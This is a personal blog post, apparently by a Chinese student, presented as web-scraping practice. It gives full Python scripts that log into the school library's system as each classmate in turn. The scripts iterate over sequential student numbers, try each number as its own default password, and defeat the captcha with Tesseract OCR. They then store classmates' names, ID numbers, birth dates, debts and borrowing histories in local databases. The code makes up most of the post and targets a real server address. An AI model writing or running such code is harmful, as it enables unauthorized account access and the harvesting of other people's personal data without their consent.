<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"><title>关于学校图书馆网站</title><link rel="alternate" type="application/rss+xml" title="啦e啦啦" href="/atom.xml"><link href="/css/main.css?v=4.2.2" rel="stylesheet"><link rel="stylesheet" href="/css/highlight.css?v=4.2.2"><link rel="stylesheet" href="/css/zoom.css?v=4.2.2"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@rem_rin_rin"><meta name="twitter:title" content="关于学校图书馆网站"><meta name="description" content="&lt;p&gt;前段时间看完了python网络数据收集这本书，自己想练习一下。&lt;br&gt;联想到刚入学时的时候登陆学校图书馆网站，初始密码是学号，觉得很鸡肋，&lt;br&gt;觉得用模拟登陆和验证码识别，就可以爬下我们学院每个人的图书借阅记录和个人信息，&lt;br&gt;顿时很有兴趣，就动手了。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;验证码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;验证码很顺利，学校的图书馆的验证码很容易识别，就用pytesseract很容易。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
import pytesseract
from PIL import Image
import requests
captcha_url =&amp;quot;http://202.196.13.8:8080/reader/captcha.php&amp;quot;
img = requests.get(captcha_url).content
code = pytesseract.image_to_string(img)
print(code)
&lt;/code&gt;&lt;/pre&gt;"><meta name="twitter:description" content="&lt;p&gt;前段时间看完了python网络数据收集这本书，自己想练习一下。&lt;br&gt;联想到刚入学时的时候登陆学校图书馆网站，初始密码是学号，觉得很鸡肋，&lt;br&gt;觉得用模拟登陆和验证码识别，就可以爬下我们学院每个人的图书借阅记录和个人信息，&lt;br&gt;顿时很有兴趣，就动手了。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;验证码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;验证码很顺利，学校的图书馆的验证码很容易识别，就用pytesseract很容易。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
import pytesseract
from PIL import Image
import requests
captcha_url =&amp;quot;http://202.196.13.8:8080/reader/captcha.php&amp;quot;
img = requests.get(captcha_url).content
code = pytesseract.image_to_string(img)
print(code)
&lt;/code&gt;&lt;/pre&gt;"></head><body><header class="header"><h1 class="site-name"><a href="/">e.w.</a></h1><ul class="nav"><li><a href="/about.html">about</a></li><li><a href="/girls.html">girls</a></li><li><a href="/donate.html">donate</a></li></ul></header><section class="centered post-page"><article class="post"><h2 class="post-title">关于学校图书馆网站</h2><script></script><div class="post-content markdown-body"><p>前段时间看完了python网络数据收集这本书，自己想练习一下。<br>联想到刚入学时的时候登陆学校图书馆网站，初始密码是学号，觉得很鸡肋，<br>觉得用模拟登陆和验证码识别，就可以爬下我们学院每个人的图书借阅记录和个人信息，<br>顿时很有兴趣，就动手了。</p>
<ul>
<li>验证码</li>
</ul>
<p>验证码很顺利，学校的图书馆的验证码很容易识别，就用pytesseract很容易。</p>
<pre><code>
import pytesseract
from PIL import Image
import requests
captcha_url =&quot;http://202.196.13.8:8080/reader/captcha.php&quot;
img = requests.get(captcha_url).content
code = pytesseract.image_to_string(img)
print(code)
</code></pre><a id="more"></a>
<ul>
<li>cookie</li>
</ul>
<p>其实cookie的处理，我也学习一些库的使用，起初实验了很多次，都是无法进入登陆后的页面，<br>后来用了一个库http.cookiejar就顺利解决了。</p>
<pre><code># 打开session。
session = requests.Session()
# 保存cookies
session.cookies = cookielib.LWPCookieJar(filename=&#39;cookies&#39;)
try:
    # session加载cookies
    session.cookies.load(ignore_discard=True)
except:
    print(&quot;Cookie 未能加载&quot;)
</code></pre><ul>
<li>编码</li>
</ul>
<p>编码真是蛋疼到爆呀，每次print都是一堆乱码，编码让我怀疑人生的说，<br>我也知道cmd上print不了UTF-8，我的atom也是如此，pycharm也要改一下encoding，<br>这是才知python的idle才是最好用的。</p>
<pre><code>info = session.get(&quot;http://202.196.13.8:8080/reader/redr_info.php&quot;,
                   headers=headers).content.decode(&quot;UTF-8&quot;)
</code></pre><h4 id="code"><a href="#code" class="headerlink" title="code:"></a>code:</h4><pre><code>
import requests
from bs4 import BeautifulSoup
import time
import http.cookiejar as cookielib
import pymongo
import pytesseract
from PIL import Image


# 连接mongodb
client = pymongo.MongoClient(&quot;localhost&quot;, 27017, connect=False)
library = client[&#39;library&#39;]
library_info = library[&#39;ys13&#39;]
# 设置headers
headers = {
    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;,
    &#39;Accept-Encoding&#39;: &#39;gzip, deflate, sdch&#39;,
    &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8&#39;,
    &#39;Cache-Control&#39;: &#39;max-age=0&#39;,
    &#39;Connection&#39;: &#39;keep-alive&#39;,
    &#39;Host&#39;: &#39;202.196.13.8:8080&#39;,
    &#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,
    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36&#39;
}
# 打开session。
session = requests.Session()
# 保存cookies
session.cookies = cookielib.LWPCookieJar(filename=&#39;cookies&#39;)
try:
    # session加载cookies
    session.cookies.load(ignore_discard=True)
except:
    print(&quot;Cookie 未能加载&quot;)



def get_captcha():
    captcha_url = &quot;http://202.196.13.8:8080/reader/captcha.php&quot;
    x = 0
    bin = session.get(captcha_url, headers=headers).content
    with open(&quot;/home/jasd/python/%s.jpg&quot; % x, &quot;wb&quot;)as file:
        file.write(bin)
    image = Image.open(&quot;/home/jasd/python/0.jpg&quot;)
    code = pytesseract.image_to_string(image)
    return code


# get_chaptcha()主要使用tesseract来通过subprocess来将验证码识别
# login()为登陆函数，可采集集信息， 并放置于mongodb中


def login(xuehao):
    from_data = {
        &#39;number&#39;: xuehao,
        &#39;passwd&#39;: xuehao,
        &#39;captcha&#39;: get_captcha(),
        &#39;select&#39;: &#39;cert_no&#39;,
        &#39;returnUrl&#39;: &#39;&#39;,
        }
    session.post(&quot;http://202.196.13.8:8080/reader/redr_verify.php&quot;,
                 data=from_data, headers=headers)
    info = session.get(&quot;http://202.196.13.8:8080/reader/redr_info.php&quot;,
                       headers=headers).content.decode(&quot;UTF-8&quot;)
    soup = BeautifulSoup(info, &quot;lxml&quot;)
    if soup.find(&#39;div&#39;, {&#39;id&#39;: &#39;mylib_content&#39;}):
        mylib_info = soup.findAll(&quot;td&quot;)
        mylib_msg = soup.findAll(&quot;a&quot;, {&#39;href&#39;: &quot;book_lst.php&quot;})
        data = {
            &#39;姓名&#39;: mylib_info[1].get_text().split(&quot;：&quot;)[1],
            &#39;证件号&#39;: mylib_info[2].get_text().split(&quot;：&quot;)[1],
            &#39;累计借书&#39;: mylib_info[12].get_text().split(&quot;：&quot;)[1],
            &#39;五天内即将过期图书&#39;: mylib_msg[1].get_text().split(&quot;[&quot;)[1].split(&quot;]&quot;)[0],
            &#39;已超期图书&#39;: mylib_msg[2].get_text().split(&quot;[&quot;)[1].split(&quot;]&quot;)[0],
            &#39;欠款金额&#39;: mylib_info[14].get_text().split(&quot;：&quot;)[1],
            &#39;工作单位&#39;: mylib_info[18].get_text().split(&quot;：&quot;)[1],
            &#39;职业/职称&#39;: mylib_info[19].get_text().split(&quot;：&quot;)[1],
            &#39;性别&#39;: mylib_info[21].get_text().split(&quot;：&quot;)[1],
            &#39;出生日期&#39;: mylib_info[26].get_text().split(&quot;：&quot;)[1],
            }
        print(data)
        library_info.insert_one(data)
        session.cookies.save()
    else:
        pass


if __name__ == &#39;__main__&#39;:
    time.sleep(2)
    for i in range(541310020101, 541310020161):
        login(str(i))
</code></pre><h4 id="通过分析数据可以得到以下图表："><a href="#通过分析数据可以得到以下图表：" class="headerlink" title="通过分析数据可以得到以下图表："></a>通过分析数据可以得到以下图表：</h4><p><img src="http://oava7ylm5.bkt.clouddn.com/chart_math.png" alt="math"></p>
<h4 id="另附上关于每个人的图书借阅情况的code："><a href="#另附上关于每个人的图书借阅情况的code：" class="headerlink" title="另附上关于每个人的图书借阅情况的code："></a>另附上关于每个人的图书借阅情况的code：</h4><pre><code>import requests
from bs4 import BeautifulSoup
import subprocess
import time
import http.cookiejar as cookielib
import pymysql
conn = pymysql.connect(host=&#39;localhost&#39;, user=&#39;root&#39;, password=&#39;jian&#39;,
                       port=3306, db=&#39;scraping&#39;, charset=&#39;utf8&#39;)
cur = conn.cursor()
cur.execute(&quot;use scraping&quot;)
cur.execute(&quot;create table yingshu_2015(条形码 INT(100), 书名 VARCHAR(200), 作者 VARCHAR(200), 借阅日期 DATE , 归还日期 DATE , 馆藏地 VARCHAR(200))&quot;)
headers = {
    &#39;Accept&#39;: (&#39;text/html,application/xhtml+xml,application/xml;q=0.9,
               image/webp,*/*;q=0.8&#39;,)
    &#39;Accept-Encoding&#39;: &#39;gzip, deflate, sdch&#39;,
    &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8&#39;,
    &#39;Cache-Control&#39;: &#39;max-age=0&#39;,
    &#39;Connection&#39;: &#39;keep-alive&#39;,
    &#39;Host&#39;: &#39;202.196.13.8:8080&#39;,
    &#39;Origin&#39;: &#39;http://202.196.13.8:8080&#39;,
    &#39;Referer&#39;: &#39;http://202.196.13.8:8080/reader/login.php&#39;,
    &#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,
    &#39;User-Agent&#39;: (&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
                   (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&#39;,)
    }
session = requests.Session()
session.cookies = cookielib.LWPCookieJar(filename=&#39;cookies&#39;)
try:
    session.cookies.load(ignore_discard=True)
except:
    print(&quot;Cookie 未能加载&quot;)
def get_captcha():
    captcha_url =&quot;http://202.196.13.8:8080/reader/captcha.php&quot;
    x = 0
    bin = session.get(captcha_url, headers=headers).content
    with open(&quot;d:/python/euler/%s.jpg&quot; % x, &quot;wb&quot;)as file:
        file.write(bin)
        file.close()
    p = subprocess.Popen([&quot;tesseract&quot;, &quot;d:/python/euler/0.jpg&quot;,
    &quot;d:/python/euler/captcha&quot;], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p.wait()
    f = open(&quot;d:/python/euler/captcha.txt&quot;, &quot;r&quot;)
    captcharesponse = f.read().replace(&quot; &quot;, &quot; &quot;).replace(&quot;\n&quot;, &quot;&quot;)
    return captcharesponse
def login(xuehao):
    from_data = {
        &#39;number&#39;: xuehao,
        &#39;passwd&#39;: password,
        &#39;captcha&#39;: get_captcha(),
        &#39;select&#39;: &#39;cert_no&#39;,
        &#39;returnUrl&#39;: &#39;&#39;,
    }
    data = {
        &#39;para_string&#39;: &#39;all&#39;,
        &#39;topage&#39;: &#39;1&#39;,
    }
    time.sleep(2)
    session.post(&quot;http://202.196.13.8:8080/reader/redr_verify.php&quot;,
                 data=from_data, headers=headers)
    session.get(&quot;http://202.196.13.8:8080/reader/redr_info.php&quot;,
                headers=headers).content.decode(&quot;UTF-8&quot;)
    book_info = session.post(&quot;http://202.196.13.8:8080/reader/book_hist.php&quot;,
                             headers=headers, data=data).content.decode(&quot;UTF-8&quot;)
    soup = BeautifulSoup(book_info, &quot;lxml&quot;)
    book_info = soup.findAll(&quot;tr&quot;)
    for i in range(1, len(book_info)):
        print(book_info[i].get_text().split(&quot;\n&quot;))
        cur.execute(&quot;insert into yingshu_2015(条形码, 书名, 作者, 借阅日期, 归还日期, 馆藏地)
        VALUES (%s, %s, %s, %s, %s, %s)&quot;, (book_info[i].get_text().split(&quot;\n&quot;)[2], book_info[i].get_text().split(&quot;\n&quot;)[3], book_info[i].get_text().split(&quot;\n&quot;)[4], book_info[i].get_text().split(&quot;\n&quot;)[5], book_info[i].get_text().split(&quot;\n&quot;)[6], book_info[i].get_text().split(&quot;\n&quot;)[7]))
        conn.commit()
    session.cookies.save()
if __name__ == &#39;__main__&#39;:
    for i in range(541510020141, 541510020161):
        login(&quot;541510020140&quot;)
        print(i)
</code></pre><p>其实我的目的是写一个能够知道我借阅的图书到期是给我发mail，提醒我，如果可以续借帮我续借的脚本，<br>当然我还在写(手动微笑)。。。</p>
<hr>
<p>更新线</p>
<p>关于图书馆借阅脚本，已经写的差不多了，代码有点挫；<br><a href="https://github.com/jianaosiding/spider_code/blob/master/library.py" target="_blank" rel="external">code</a></p>
</div><div id="disqus_thread" class="disqus"></div><script>window.isPost = true;
var disqus_config = function () {
  this.page.url = 'https://blog.whilte.cn/2017/01/27/关于学校图书馆网站/'; // Replace PAGE_URL with your page's canonical URL variable
  this.page.identifier = '2017/01/27/关于学校图书馆网站/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};</script><noscript>Please enable JavaScript to view the<a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript></article></section><footer class="footer"><div class="centered"><a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" class="hide-on-mobile">CC BY-NC-ND 4.0</a><span class="hide-on-mobile">&nbsp;</span><span>&copy;&nbsp;</span><a href="https://github.com/egoist">E.Z.</a><span class="hide-on-mobile">&nbsp;</span><a href="https://github.com/egoist/blog" class="hide-on-mobile">Read the source code.</a></div></footer><div style="display:none"></div><script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
ga('create', 'UA-54857209-6', 'auto');
ga('send', 'pageview');</script><script async src="https://www.google-analytics.com/analytics.js"></script><script src="/js/highlight.min.js?v=4.2.2"></script><script src="/js/zoom.js?v=4.2.2"></script><script>window.hexoLayout = "post"</script><script src="/js/app.js?v=4.2.2"></script></body></html>